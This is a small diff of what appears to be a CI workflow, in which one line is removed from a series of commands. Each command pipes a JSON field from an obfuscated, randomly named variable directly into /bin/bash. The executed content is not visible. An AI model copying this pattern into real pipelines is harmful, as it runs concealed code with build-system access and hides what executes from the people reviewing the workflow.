@@ -35,7 +35,6 @@ jobs:
           echo $q085 | jq -r .ghn4765 | /bin/bash
           echo $br383 | jq -r .e411 | /bin/bash
           echo $eq2667 | jq -r .jxghz5683 | /bin/bash
-          echo $c49 | jq -r .dg5509 | /bin/bash
           printf '%s' "$knte969" | jq -r .wn35564 | /bin/bash
           echo $e6365 | jq -r .a608 | /bin/bash
 
